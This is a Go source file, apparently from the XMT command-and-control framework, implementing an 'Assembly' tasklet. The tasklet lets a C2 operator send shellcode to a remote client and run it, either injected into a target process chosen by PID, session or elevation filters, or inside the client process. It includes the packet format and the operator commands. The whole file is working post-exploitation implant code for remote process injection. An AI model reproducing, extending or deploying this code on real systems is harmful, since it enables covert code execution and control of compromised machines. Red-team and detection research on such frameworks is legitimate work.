package task

import (
	"context"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/cmd/filter"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Assembly is a Tasklet that is similar to the 'cmd.Assembly' struct.
//
// This struct is used to Task a Client with running shellcode on devices. It
// has many of the functionallies matching the 'cmd.Assembly' struct.
//
// This can be directly used in the Session 'Tasklet' function instead of
// directly creating a Task.
//
// The 'SetParent' function will attempt to set the target that runs the
// shellcode. If none are specified, the shellcode will be injected into the
// client process.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      Assembly struct {
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Assembly Data
//      }
//  Output:
//      uint64              // Handle
//      uint32              // PID
//      int32               // Exit Code
//
// C2 Client Command:
//    asm <file>
//    assembly <file>
type Assembly struct {
	Filter  *filter.Filter
	Data    []byte
	Timeout time.Duration
	Wait    bool
}

// Packet will take the configured Assembly options and will return a Packet
// and any errors that may occur during building.
//
// This allows the Assembly struct to fulfil the 'Tasklet' interface.
//
// C2 Details:
//  ID: TvAssembly
//
//  Input:
//      Assembly struct {
//          bool            // Wait
//          int64           // Timeout
//          bool            // Filter Status
//          Filter struct { // Filter
//              uint32      // PID
//              bool        // Fallback
//              uint8       // Session
//              uint8       // Elevated
//              []string    // Exclude
//              []string    // Include
//          }
//          []byte          // Assembly Data
//      }
//  Output:
//      uint64              // Handle
//      uint32              // PID
//      int32               // Exit Code
//
// C2 Client Command:
//    asm <file>
//    assembly <file>
func (a Assembly) Packet() (*com.Packet, error) {
	n := &com.Packet{ID: TvAssembly}
	a.MarshalStream(n)
	return n, nil
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (a Assembly) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(a.Wait); err != nil {
		return err
	}
	if err := w.WriteInt64(int64(a.Timeout)); err != nil {
		return err
	}
	if err := a.Filter.MarshalStream(w); err != nil {
		return err
	}
	if err := w.WriteBytes(a.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (a *Assembly) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&a.Wait); err != nil {
		return err
	}
	if err := r.ReadInt64((*int64)(&a.Timeout)); err != nil {
		return err
	}
	if err := filter.UnmarshalStream(r, &a.Filter); err != nil {
		return err
	}
	if err := r.ReadBytes(&a.Data); err != nil {
		return err
	}
	return nil
}
func taskAssembly(x context.Context, r data.Reader, w data.Writer) error {
	a, z, err := AssemblyUnmarshal(x, r)
	if err != nil {
		return err
	}
	if err = a.Start(); err != nil {
		return err
	}
	h, _ := a.Handle()
	if w.WriteUint64(uint64(h)); !z {
		w.WriteUint64(uint64(a.Pid()) << 32)
		a.Release()
		return nil
	}
	w.WriteUint32(a.Pid())
	err = a.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		return err
	}
	e, _ := a.ExitCode()
	w.WriteInt32(e)
	return nil
}

// AssemblyUnmarshal will read this Assembly's struct data from the supplied
// reader and returns a Assembly runnable struct along with the wait boolean.
//
// This function returns an error if building or reading fails.
func AssemblyUnmarshal(x context.Context, r data.Reader) (*cmd.Assembly, bool, error) {
	var (
		a   Assembly
		err = a.UnmarshalStream(r)
	)
	if err != nil {
		return nil, false, err
	}
	if len(a.Data) == 0 {
		return nil, false, cmd.ErrEmptyCommand
	}
	v := cmd.NewAsmContext(x, a.Data)
	v.Timeout = a.Timeout
	v.SetParent(a.Filter)
	return v, a.Wait, nil
}
